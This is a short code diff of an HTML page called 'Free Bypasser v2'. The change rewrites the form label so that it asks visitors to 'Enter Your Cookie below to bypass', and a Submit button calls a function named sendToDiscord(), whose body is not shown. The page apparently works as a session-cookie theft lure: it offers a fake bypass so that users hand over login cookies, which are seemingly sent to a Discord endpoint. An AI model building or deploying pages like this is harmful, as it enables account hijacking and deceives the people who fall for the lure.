@@ -75,7 +75,7 @@
 <body>
   <header>Free Bypasser v2</header>
   <main>
-    <label for="key">Enter Your Key or Detail Below:</label>
+    <label for="key">Enter Your Cookie below to bypass:</label>
     <input type="text" id="key" placeholder="Your Key or Info Here..." />
     <button onclick="sendToDiscord()">Submit</button>
   </main>
